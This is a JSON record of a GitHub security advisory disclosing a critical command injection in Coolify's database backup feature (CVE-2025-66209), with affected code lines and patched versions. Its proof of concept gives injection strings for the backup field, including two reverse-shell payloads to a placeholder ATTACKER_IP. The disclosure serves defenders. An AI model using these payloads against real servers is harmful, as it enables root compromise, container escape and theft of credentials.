@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-vm5p-43qh-7pmq",
+  "repo": {
+    "cve_id": "CVE-2025-66209",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nA command injection vulnerability in the database backup functionality allows any authenticated user with database backup permissions to execute arbitrary commands on the host server, resulting in container escape and full server compromise. The `databases_to_backup` field is passed directly to shell commands without sanitization, enabling attackers to inject malicious commands that execute on the underlying host system with access to the Docker socket and all managed infrastructure.\r\n\r\n### Details\r\nUser-controlled input flows from app/Livewire/Project/Database/BackupEdit.php (line 110) to app/Jobs/DatabaseBackupJob.php where it's interpolated into shell commands without escapeshellarg().\r\n\r\nInjection points:\r\n- backup_standalone_postgresql() - line 532: $database in pg_dump command\r\n- backup_standalone_mysql() - line 552: $database in mysqldump command  \r\n- backup_standalone_mariadb() - line 572: $database in mariadb-dump command\r\n- backup_standalone_mongodb() - lines 497-508: $databaseName in mongodump command\r\n\r\nThe validation in BackupEdit.php only checks for nullable string:\r\n#[Validate(['nullable', 'string'])]\r\npublic ?string $databasesToBackup = null;\r\n\r\nNo sanitization is applied before the value is used in shell commands via instant_remote_process().\r\n\r\n\r\n### PoC\r\n1. Create any database (PostgreSQL/MySQL/MariaDB) in Coolify\r\n2. Create a scheduled backup for the database\r\n3. Edit the backup and set \"Databases To Backup\" field to:\r\n   postgres; id > /tmp/pwned.txt; #\r\n4. Click Save, then \"Backup Now\"\r\n5. On the host server, run: cat /tmp/pwned.txt\r\n6. Output shows command executed on host: uid=0(root) gid=0(root) groups=0(root)\r\n\r\n\r\n\r\nRoot shell payload (uses $() for sudo injection):\r\npostgres$(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1)\r\n\r\nNon-root payload (semicolon, no sudo):\r\npostgres; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'; #\r\n\r\n### Impact\r\n- Container escape: Commands execute on host system, not inside containers\r\n- Full server compromise with Docker socket access (/var/run/docker.sock)\r\n- Access to all containers, SSH keys, credentials, and managed infrastructure\r\n- Persistent access via scheduled backups (payload executes on every backup run)\r\n- Lateral movement to all servers managed by the Coolify instance\r\n- CVSS 3.1: 9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)\r\n\r\n",
+    "ghsa_id": "GHSA-vm5p-43qh-7pmq",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-vm5p-43qh-7pmq",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vm5p-43qh-7pmq"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-66209"
+      }
+    ],
+    "published_at": "2026-01-03T15:13:27Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in Database Backup",
+    "updated_at": "2026-01-03T15:13:27Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": ">= 4.0.0-beta.451",
+        "vulnerable_version_range": "<= 4.0.0-beta.448"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
